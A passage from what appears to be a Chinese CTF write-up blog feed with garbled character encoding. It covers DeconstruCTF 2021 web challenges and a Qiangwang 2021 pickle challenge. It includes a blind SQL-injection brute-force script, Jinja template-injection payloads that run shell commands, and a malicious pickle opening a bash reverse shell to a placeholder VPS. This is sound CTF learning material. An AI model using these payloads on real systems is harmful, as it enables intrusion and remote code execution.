&lt;p>Êèê‰∫§‰∏§‰∏™ÂèÇÊï∞usernameÂíåpasswordÔºåÂõûÊòæ&lt;em>YOU LIED TO ME !!!&lt;/em>&lt;/p>
&lt;p>‚Äî‚Äî‚Äî‚ÄîÁÑ∂ÂêéÊ≤°ÁÑ∂Âêé‰∫Ü ÊàëËøòÊ≤°ÁúãÂÆå ÁéØÂ¢ÉÂ∞±ÂÖ≥‰∫ÜTAT&lt;/p>
&lt;h2 id="webcurly-fries-1">Web/Curly Fries 1&lt;/h2>
&lt;blockquote>
&lt;p>Normal fries are nice, but everything&amp;rsquo;s better with a curl in it. The flag is right in front of you.&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004170846442.png" alt="image-20211004170846442">&lt;/p>
&lt;p>emmmmm Ê≤°Êúâ‰ªª‰ΩïÊèêÁ§∫&lt;/p>
&lt;p>Áúãwp‰ª•ÂêéÂèëÁé∞ËøôÊòØÁúüËÑëÊ¥û‰∫ÜÔºå‰ΩÜ‰πü‰∏çËÉΩËøô‰πàËØ¥ÔºåÊØïÁ´üÂ∑≤ÁªèÁªôÂá∫‰∫ÜSwedenÂæàÊòéÊòæÁöÑÊèêÁ§∫ÔºåÊàë‰ª¨ÈúÄË¶ÅÁî®ÊåáÂÆöÁöÑSwedishËØ≠Ë®ÄÊù•ËÆøÈóÆËøô‰∏™ÁΩëÁ´ô&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">curl -i http://very.uniquename.xyz:8880/ -H &lt;span style="color:#d88200">&amp;#34;Accept-Language: sv-SE&amp;#34;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004171513900.png" alt="image-20211004171513900">&lt;/p>
&lt;p>&lt;code>dsc{1_l0v3_sw3d3n}&lt;/code>&lt;/p>
&lt;h2 id="webthe-gate-keeper">Web/The Gate Keeper&lt;/h2>
&lt;blockquote>
&lt;p>That what you want is with the Gate keeper, but you need to cheat the Gate keeper to get it.&lt;/p>
&lt;p>&lt;strong>Note:&lt;/strong> This challenge might require a bruteforce approach.&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004171755317.png" alt="image-20211004171755317">&lt;/p>
&lt;p>ËøòÊòØsqli&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">string&lt;/span>
&lt;span style="color:#111">flag&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">flag&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">domain&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">string&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">ascii_lowercase&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">string&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">ascii_uppercase&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">string&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">digits&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#39;_}&amp;#39;&lt;/span>
&lt;span style="color:#111">f&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>
&lt;span style="color:#111">challenge&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;gate keeper&amp;#34;&lt;/span>
&lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>
&lt;span style="color:#111">check&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>
&lt;span style="color:#111">key&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>
&lt;span style="color:#111">column&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">challenge&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#34;taxi union&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;http://extremely.uniquename.xyz:2052/&amp;#39;&lt;/span>
&lt;span style="color:#111">check&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;TN-06-AP-9879&amp;#34;&lt;/span>
&lt;span style="color:#111">key&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;lisence_plate&amp;#39;&lt;/span>
&lt;span style="color:#111">column&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;location&amp;#34;&lt;/span>
&lt;span style="color:#00a8c8">elif&lt;/span> &lt;span style="color:#111">challenge&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;gate keeper&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;http://extremely.uniquename.xyz:2082/&amp;#39;&lt;/span>
&lt;span style="color:#111">check&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;The flag for the CTF is the password you entered.(If you havent cheated that is)&amp;#34;&lt;/span>
&lt;span style="color:#111">key&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;password&amp;#39;&lt;/span>
&lt;span style="color:#111">column&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;password&amp;#34;&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;URL&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">while&lt;/span> &lt;span style="color:#00a8c8">True&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">char&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">domain&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#39; or &lt;/span>&lt;span style="color:#d88200">{}&lt;/span>&lt;span style="color:#d88200"> like &amp;#39;&lt;/span>&lt;span style="color:#d88200">{}&lt;/span>&lt;span style="color:#d88200">%&amp;#39;; --&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">format&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">column&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">flag&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">char&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">post&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#111">key&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">check&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">flag&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">flag&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">char&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Success &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">flag&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">break&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="webhungry-man">Web/Hungry Man&lt;/h2>
&lt;blockquote>
&lt;p>There is nothing here I promise! ;)&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004172041299.png" alt="image-20211004172041299">&lt;/p>
&lt;p>ÊäìÂåÖÔºåcookieÈÉ®ÂàÜÊúâ‰∏Ä‰∏™b64ÔºåËß£Á†ÅÂêé&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004172123925.png" alt="image-20211004172123925">&lt;/p>
&lt;p>ËØ¥ÂÆûËØùÔºåËøô‰∏™È¢òÂÅöÁöÑÊó∂ÂÄôÊ≤°Ê≥®ÊÑèset-cookieÁöÑÈÉ®ÂàÜÔºå&lt;a href="https://github.com/csivitu/CTF-Write-ups/tree/master/Deconstruct.f/web/Hungry%20Man">ÂèÇËÄÉwp&lt;/a>&lt;/p>
&lt;p>ËøôÈáåÁöÑ‰æùÊçÆset-cookieÁöÑÂÄºËÆæÁΩÆÂêéÔºå‰ºö‰∏çÊñ≠ÁöÑ‰∫ßÁîüÊñ∞ÁöÑmd5-hashÁöÑcookieÂÄºÔºåÂÜô‰∏Ä‰∏™ËÑöÊú¨‰∏çÊñ≠Âú∞ËÆæÁΩÆÂíåÂ∫îÁî®Êñ∞ÁöÑcookieÔºåÂ∞ÜËøô‰∫õËß£ÂØÜÂêéÊãºËµ∑Êù•Â∞±ÊòØflag‰∫Ü&lt;/p>
&lt;p>&lt;code>dsc{91v3_m3_4_h4ndfu1_0f_c00k135}&lt;/code>&lt;/p>
&lt;h2 id="webcurly-fries-2">Web/Curly Fries 2&lt;/h2>
&lt;blockquote>
&lt;p>Normal fries are nice, but everything&amp;rsquo;s better with a curl in it. Why do logos make things so recognizable?&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004172502484.png" alt="image-20211004172502484">&lt;/p>
&lt;p>Êó†ÊèêÁ§∫Ôºå&lt;a href="https://github.com/csivitu/CTF-Write-ups/tree/master/Deconstruct.f/web/Curly%20Fries%202">ÂèÇËÄÉwp&lt;/a>&lt;/p>
&lt;p>ÊúâÁÇπËÑëÊ¥û‰∫ÜÔºåÊääUser-AgentÁöÑÂú∞ÊñπËÆæÁΩÆ‰∏∫xboxÂíåLinux‰πãÂêéÔºåÂõæÁâá‰ºöÊ∂àÂ§±Âπ∂Èú≤Âá∫flag&lt;/p>
&lt;p>&lt;code>dsc{1m4g1n3_l1nux_0n_4n_xb0x}&lt;/code>&lt;/p>
&lt;h2 id="webcurly-fries-3">Web/Curly Fries 3&lt;/h2>
&lt;blockquote>
&lt;p>Normal fries are nice, but everything&amp;rsquo;s better with a curl in it. I&amp;rsquo;m with you, every step of the way.&lt;/p>
&lt;/blockquote>
&lt;p>Áõ¥Êé•ËÆøÈóÆÊèêÁ§∫405Ôºåpost‰∏Ä‰∏ãÂõûÊòæ&lt;em>perhaps try Googling me instead?&lt;/em>&lt;/p>
&lt;p>ËÆøÈóÆ/robots.txtÔºå404&lt;/p>
&lt;p>Áî®wappalyzerÂèØ‰ª•ÁúãÂà∞ËøôÊòØ‰∏Ä‰∏™flaskÂ∫îÁî®&lt;/p>
&lt;p>&lt;a href="https://github.com/csivitu/CTF-Write-ups/tree/master/Deconstruct.f/web/Curly%20Fries%203">ÂèÇËÄÉwp&lt;/a>&lt;/p>
&lt;p>ÁúãÂà∞Á¨¨‰∏Ä‰∏™ÊèêÁ§∫‰πãÂêé‰∏çÂ§üÊïèÊÑüÔºåÊàë‰ª¨ÂèØ‰ª•ËÆæÁΩÆÊù•Ê∫êreferÊòØgoogle.com&lt;/p>
&lt;pre tabindex="0">&lt;code>curl -i -X POST -H &amp;quot;Referer: https://www.google.com&amp;quot; http://overly.uniquename.xyz:2095/
&lt;/code>&lt;/pre>&lt;p>ÂõûÊòæ‰∏≠ÊèêÁ§∫Êàë‰ª¨ÂÜçËÆæÁΩÆHost&lt;/p>
&lt;pre tabindex="0">&lt;code>curl -i -X POST -H &amp;quot;Referer: https://www.google.com&amp;quot; -H&amp;quot;Host:https://dscvit.com&amp;quot; http://overly.uniquename.xyz:2095/
&lt;/code>&lt;/pre>&lt;p>ÂõûÊòæ&lt;em>potates and carrots are my friends, milk and Cookies will be my end&lt;/em>Ôºå‰∏çÊòØÂæàÊòéÊòæÔºå‰ΩÜÊòØÂ∫îËØ•ËÆæÁΩÆcookie=root&lt;/p>
&lt;p>‰πãÂêéÂõûÊòæ&lt;em>JFATHER, JMOTHER, JDAUGHTER, ____?&lt;/em>ÔºåÊèêÁ§∫Êääcontent-typeÊîπ‰∏∫json&lt;/p>
&lt;p>ÂõûÊòæ*{&amp;lsquo;error&amp;rsquo;: &amp;lsquo;json data missing&amp;rsquo;}*ÔºåÊ∑ªÂä†‰∏ÄÁÇπdata&lt;/p>
&lt;pre tabindex="0">&lt;code>curl -i -X POST -H &amp;quot;Referer: https://www.google.com&amp;quot; -H &amp;quot;Host: https://www.dscvit.com&amp;quot; -H &amp;quot;Content-Type: application/json&amp;quot; --cookie &amp;quot;user=root&amp;quot; -d '{&amp;quot;foo&amp;quot;:&amp;quot;bar&amp;quot;}' http://overly.uniquename.xyz:2095/
&lt;/code>&lt;/pre>&lt;p>ÂõûÊòæ*{&amp;lsquo;error&amp;rsquo;: {&amp;lsquo;messi&amp;rsquo;: &amp;lsquo;required&amp;rsquo;}}&lt;em>ÔºåÂ∞ÜfooÊîπ‰∏∫barÔºåÂõûÊòæ&lt;/em>{&amp;lsquo;error&amp;rsquo;: {&amp;lsquo;messi&amp;rsquo;: &amp;lsquo;which club am i at?'}}*&lt;/p>
&lt;p>*‰∏çÂ§™ÊáÇ‰∏∫Âï•ËøôÂ∞±ËÉΩÁü•ÈÅìÊääbarËµãÂÄº‰∏∫PSGÔºüÔºüÔºü&lt;/p>
&lt;pre tabindex="0">&lt;code>curl -i -X POST -H &amp;quot;Referer: https://www.google.com&amp;quot; -H &amp;quot;Host: https://www.dscvit.com&amp;quot; -H &amp;quot;Content-Type: application/json&amp;quot; --cookie &amp;quot;user=root&amp;quot; -d '{&amp;quot;messi&amp;quot;:&amp;quot;psg&amp;quot;}' http://overly.uniquename.xyz:2095/
&lt;/code>&lt;/pre>&lt;p>ÂæóÂà∞flag &lt;code>dsc{th15_15_w4y_t00_much_w0rk}&lt;/code>&lt;/p>
&lt;h2 id="webmega-mailer">Web/Mega Mailer&lt;/h2>
&lt;blockquote>
&lt;p>We recently launched a mass email sender that can work with any SMTP server, but recently we have reports of information leaks and and trolling through our service. Can you find whats wrong with it ?&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004005500420.png" alt="image-20211004005500420">&lt;/p>
&lt;p>ËÆ≤ÁúüÔºå‰πãÂâçÊ≤°Êé•Ëß¶Ëøá&lt;/p>
&lt;p>È¶ñÂÖàÂú®Ëá™Â∑±ÁöÑvps‰∏äÂºÄ‰∏Ä‰∏™smtpÁöÑÊúçÂä°ÔºåÁî®pythonÂºÄ&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">python3 -m smtpd -c DebuggingServer -n 0.0.0.0:25
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ÁÑ∂ÂêéÂÖ∂ÂÆÉ‰ø°ÊÅØÊ≠£Â∏∏Â°´ÔºåbodyÈÉ®ÂàÜÂ≠òÂú®sstiÊ≥®ÂÖ•ÔºåpayloadÊù•Ëá™‰∫é&lt;a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection">PayloadsAllTheThings&lt;/a>&lt;/p>
&lt;pre tabindex="0">&lt;code>{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}
{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('ls -a').read()}}
{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat flag').read()}}
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004181339121.png" alt="image-20211004181339121">&lt;/p>
&lt;p>&lt;code>dsc{819_8r41n_m41L3R}&lt;/code>&lt;/p>
&lt;p>ÂèÇËÄÉÔºö&lt;a href="https://github.com/ComdeyOverFlow/DeconstruCTF-2021/blob/main/Mega-Mailer/README.md">wp&lt;/a>&lt;/p>
&lt;hr>
&lt;p>ËØ¥ÂÆûËØùÔºåËøô‰∏ÄÁØáwpÊó©Â∞±Ê∞¥ÂÆå‰∫ÜÔºå‰ΩÜÊòØ‰∏≠Èó¥ÈÇ£‰∏™Never gonna lie to youÁöÑÈ¢òÂõ†‰∏∫Ê≤°ÊúâÂú∞ÊñπÂ§çÁé∞‰πüÊ≤°ÊêúÁùÄÂà´ÁöÑwpÂ∞±‰∏ÄÁõ¥ÊãñÁùÄÔºåÊãñÂà∞Áé∞Âú®ÔºåËøòÊòØÊ≤°ÊâæÂà∞ÔºåÊîæÂºÉ‰∫ÜÔºåÂèØÊÉúÊ≠ª‰∫ÜÔºåËøô‰∏™ÊïÖ‰∫ãÂëäËØâÊàë‰ª¨ÂÅöÈ¢òÂ§çÁé∞Ë¶ÅË∂ÅÊó©&lt;/p></description></item><item><title>2021Âº∫ÁΩëÊãüÊÄÅ Wp</title><link>https://amiaaaz.github.io/2021/10/26/qwnt2021-wp/</link><pubDate>Tue, 26 Oct 2021 20:17:24 +0800</pubDate><guid>https://amiaaaz.github.io/2021/10/26/qwnt2021-wp/</guid><description>&lt;blockquote>
&lt;p>webÊúâ3‰∏™ÈÉΩÊòØÊúâ‰∫ÜÂåÖÊµÜÁöÑÂéüÈ¢ò‚Ä¶‚Ä¶ËøòÊúâ‰∏ÄÁÇπËÑëÊ¥ûÈ¢òÔºåÂèçÊ≠£Â•áÂ•áÊÄ™ÊÄ™ÁöÑ&lt;/p>
&lt;p>Â±û‰∫éÊòØË¢´Â∏àÂÇÖ‰ª¨Â∏¶È£û‰∫ÜÔºåÊâÄ‰ª•ËØ¶ÁªÜÁöÑwpËøòÊòØËá™Â∑±ÂÜô‰∏ÄÂÜôÔºåËÆ§ÁúüÂú∞Â§çÁé∞‰∏Ä‰∏ã&lt;/p>
&lt;/blockquote>
&lt;h2 id="zerocalc">zerocalc&lt;/h2>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024031549328.png" alt="image-20211024031549328">&lt;/p>
&lt;p>emmmmmm ËØ¥ÂÆûËØù‰∏ÄÂºÄÂßãÊ≤°ÊúâÂá∫ Âõ†‰∏∫Ê≤°ÊÇüÂá∫Êù•ÂÆÉËøôÊòØ‰∏™‰ªÄ‰πàÈÄªËæë2333333&lt;/p>
&lt;h2 id="ezpickle">ezPickle&lt;/h2>
&lt;pre tabindex="0">&lt;code># Áî®pker.pyÁîüÊàêpayload
notadmin=GLOBAL('config','notadmin')
notadmin[&amp;quot;admin&amp;quot;]=&amp;quot;yes&amp;quot;
exec=GLOBAL('config','backdoor')
payload='''__import__('subprocess').call(\&amp;quot;echo -e '#!/bin/bash\\nsh -i &amp;gt;&amp;amp; /dev/tcp/you_vps_ip/port 0&amp;gt;&amp;amp;1'&amp;gt;x &amp;amp;&amp;amp; bash x &amp;amp;&amp;amp; rm -rf x\&amp;quot;,shell=True)'''
exec(payload)
return
&lt;/code>&lt;/pre>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;cconfig&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">notadmin&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">p0&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">0g0&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">S&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">admin&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;\n&lt;/span>&lt;span style="color:#d88200">S&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">yes&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;\n&lt;/span>&lt;span style="color:#d88200">scconfig&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">backdoor&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">p2&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">0S&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">__import__(&lt;/span>&lt;span style="color:#8045ff">\\\&amp;#39;&lt;/span>&lt;span style="color:#d88200">subprocess&lt;/span>&lt;span style="color:#8045ff">\\\&amp;#39;&lt;/span>&lt;span style="color:#d88200">).call(&amp;#34;echo -e &lt;/span>&lt;span style="color:#8045ff">\\\&amp;#39;&lt;/span>&lt;span style="color:#d88200">#!/bin/bash&lt;/span>&lt;span style="color:#8045ff">\\\\&lt;/span>&lt;span style="color:#d88200">nsh -i &amp;gt;&amp;amp; /dev/tcp/you_vps_ip/port 0&amp;gt;&amp;amp;1&lt;/span>&lt;span style="color:#8045ff">\\\&amp;#39;&lt;/span>&lt;span style="color:#d88200">&amp;gt;x &amp;amp;&amp;amp; bash x &amp;amp;&amp;amp; rm -rf x&amp;#34;,shell=True)&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;\n&lt;/span>&lt;span style="color:#d88200">p3&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">0g2&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">(g3&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">tR.&amp;#39;&lt;/span>
&lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> &lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;xxxxxxxxxx&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211023215957693.png" alt="image-20211023215957693">&lt;/p>
&lt;p>Ê≤°‰ªÄ‰πàÂ•ΩËØ¥ÁöÑÔºåÂü∫Á°ÄÁöÑpickleÈ¢òÔºåÊòØ2021Â∑ÖÂ≥∞ÊûÅÂÆ¢what_pickleÁöÑÈòâÂâ≤ÁâàÔºàÊûÑÈÄ†ÁöÑÊÄùË∑ØÂá†‰πé‰∏ÄÊ†∑ ‰ΩÜÊòØÁÆÄÂçïÂæàÂ§öÔºâÔºåÂá†‰πé‰∏ÄÊ†∑ÁöÑÈ¢òÁõÆËøòÊúâ [SUCTF 2019]Guess Game&lt;/p>
&lt;p>ÈôêÂà∂ÁöÑÁÇπÂú®‰∫é&lt;u>&lt;a href="https://amiaaaz.github.io/2021/08/12/python-unserialize-notes-01-python/#--%E4%BB%85%E5%8F%AF%E4%BB%A5%E5%BC%95%E5%85%A5%E9%A2%98%E7%9B%AE%E4%B8%AD%E8%87%AA%E8%AE%BE%E7%9A%84%E6%A8%A1%E5%9D%97%E6%A8%A1%E5%9D%97%E5%90%8D%E4%B8%8D%E8%83%BD%E6%9C%89__%E7%AC%A6">Âè™ÂÖÅËÆ∏ÂºïÂÖ•È¢òÁõÆËá™ËÆæÊ®°Âùó&amp;amp;ÈôêÂà∂Ê®°Âùó‰∏≠Âê´‰∏ãÂàíÁ∫ø&lt;/a>&lt;/u>ÔºåÈÇ£Â∞±Áõ¥Êé•ÂèòÈáèË¶ÜÁõñÔºåÁÑ∂ÂêéÂà©Áî®ÁªôÂá∫ÁöÑ&lt;code>eval()&lt;/code>ÂºπshellÂ∞±Â•Ω‰∫Ü&lt;/p>
&lt;p>‚Äî‚Äî‚Äî‚ÄîÂè¶Â§ñËøôÈáåÁöÑpayload‰πüÂèØ‰ª•ÊòØÁÆÄÁü≠ÁâàÊú¨ÁöÑÂºπsehllÁöÑpayload ‰∏çÂîØ‰∏ÄÂòõ&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;cconfig&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">notadmin&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">p0&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">0g0&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">S&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">admin&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;\n&lt;/span>&lt;span style="color:#d88200">S&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">yes&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;\n&lt;/span>&lt;span style="color:#d88200">scconfig&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">backdoor&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">p2&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">0S&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">__import__(&amp;#34;os&amp;#34;).system(&amp;#34;bash -c &lt;/span>&lt;span style="color:#8045ff">\\\&amp;#39;&lt;/span>&lt;span style="color:#d88200">exec bash -i &amp;amp;&amp;gt;/dev/tcp/you_vps_ip/port &amp;lt;&amp;amp;1&lt;/span>&lt;span style="color:#8045ff">\\\&amp;#39;&lt;/span>&lt;span style="color:#d88200">&amp;#34;)&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;\n&lt;/span>&lt;span style="color:#d88200">p3&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">0g2&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">(g3&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">tR.&amp;#39;&lt;/span>
